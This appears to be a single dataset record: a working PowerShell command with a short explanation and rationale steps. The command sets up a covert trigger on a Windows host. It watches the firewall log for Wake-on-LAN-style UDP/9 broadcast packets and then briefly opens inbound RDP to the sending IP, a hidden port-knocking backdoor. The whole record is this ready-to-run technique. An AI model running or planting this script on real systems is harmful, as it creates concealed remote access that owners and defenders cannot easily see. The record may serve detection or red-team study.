command: Invoke-Command -ComputerName localhost -ScriptBlock { $log = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'ALLOW\s+UDP\s+(\d{1,3}(?:\.\d{1,3}){3})\s+255\.255\.255\.255\s+\d+\s+9\b.*\bsize\s+10(2|8)\b') { $src=$matches[1]; $name="wol-rdp-$($src.Replace('.','-'))"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }
explanation: Treats reception of a Wake-on-LAN magic packet (UDP/9 broadcast, characteristic size) as a covert signal to allow RDP from the sender IP.
rationale_steps: Watch for broadcast UDP/9 packets with typical magic-packet sizes
Open inbound RDP scoped to the source IP
